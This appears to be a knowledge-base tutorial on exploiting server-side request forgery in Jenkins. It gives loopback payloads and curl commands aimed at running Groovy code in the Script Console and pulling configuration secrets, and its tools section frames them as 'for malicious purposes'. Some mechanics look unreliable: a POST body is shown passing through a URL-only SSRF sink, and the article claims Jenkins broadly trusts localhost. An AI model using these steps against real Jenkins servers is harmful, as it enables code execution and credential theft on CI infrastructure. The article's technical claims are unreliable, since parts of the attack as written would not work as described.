---
title: Exploiting Jenkins SSRF for Internal Access
description: Learn how to exploit Jenkins SSRF vulnerabilities to access internal
  services and sensitive data.
keywords:
- Jenkins SSRF
- Jenkins vulnerabilities
- Groovy script execution
- SSRF exploitation
- Jenkins HTTP endpoints
---

# Jenkins

## Context

This article demonstrates the operational exploitation of Jenkins HTTP endpoints through Server-Side Request Forgery (SSRF) to interact with internal services and access sensitive data. Readers should have foundational knowledge of the HTTP protocol and general SSRF attack principles to understand the techniques discussed.

## Theory

### Jenkins Architecture and HTTP Exposure

Jenkins is a popular continuous integration and continuous delivery (CI/CD) automation server featuring a web-based management interface and REST API. It exposes several HTTP endpoints that allow for job management, plugin administration, and system configuration. Since Jenkins often runs with elevated privileges, it may have access to internal network resources, increasing its risk profile in organizations.

### Jenkins Console and Internal Config Endpoints

A critical feature of Jenkins is the Script Console, which permits the execution of Groovy scripts with system-level privileges. This functionality is accessible through endpoints such as `/script`, `/manage`, and `/configure`, which can expose sensitive settings and credentials if improperly secured. SSRF vulnerabilities can be exploited to access these endpoints from within the Jenkins server context, making them attractive targets for attackers.

### SSRF Exploitation in Jenkins

In an SSRF attack targeting Jenkins, an attacker must first identify a vulnerable plugin or endpoint, typically one that processes user-supplied URLs, such as a build trigger with a webhook URL. Upon finding such a vulnerability, the attacker crafts a request to target internal Jenkins HTTP endpoints, such as `/script` or `/manage`, to execute Groovy code or extract sensitive configuration. 

### Jenkins Security Mechanisms and SSRF Bypass

Jenkins is built on trust assumptions that requests from `localhost` or the internal network are trustworthy. SSRF payloads can exploit this assumption by utilizing `127.0.0.1`, `localhost`, or the IPv6 loopback address to access protected endpoints. The lack of rigorous validation in some plugins allows user-supplied URLs to bypass security measures, facilitating SSRF attacks.

## Practice

### Access Jenkins Script Console via SSRF

- Identify a Jenkins plugin or endpoint that is vulnerable to SSRF. This could be a build trigger configured to accept webhook URLs. Understanding the location of this SSRF sink will allow you to form a strategy to relay requests to internal Jenkins endpoints.
    - Example Payload:  
      ```http
      http://127.0.0.1:8080/script
      ```
- Use the following command to send an SSRF payload to the vulnerable endpoint:
    ```bash
    curl -X POST -d 'script=println(\"ssrf_test\")' http://<vulnerable-plugin-endpoint>?url=http://127.0.0.1:8080/script
    ```
- Outcome: By executing this payload, you leverage SSRF to execute arbitrary Groovy code on the Jenkins server.

### Extract Jenkins Internal Configuration via SSRF

- Exploit SSRF to access endpoints that handle sensitive configurations, such as `/manage` or `/configure`. By doing so, you can retrieve internal Jenkins data.
    - Example Payload:  
      ```http
      http://127.0.0.1:8080/manage
      ```
- Use the following command to send an SSRF request through the vulnerable endpoint:
    ```bash
    curl http://<vulnerable-plugin-endpoint>?url=http://127.0.0.1:8080/manage
    ```
- Outcome: This allows access to sensitive Jenkins configurations, secrets, or credentials through SSRF exploitation.

## Tools

- **curl**
- **Burp Suite** 

These tools are essential for crafting and sending HTTP requests that exploit SSRF vulnerabilities effectively, enabling interaction with the Jenkins interface for malicious purposes.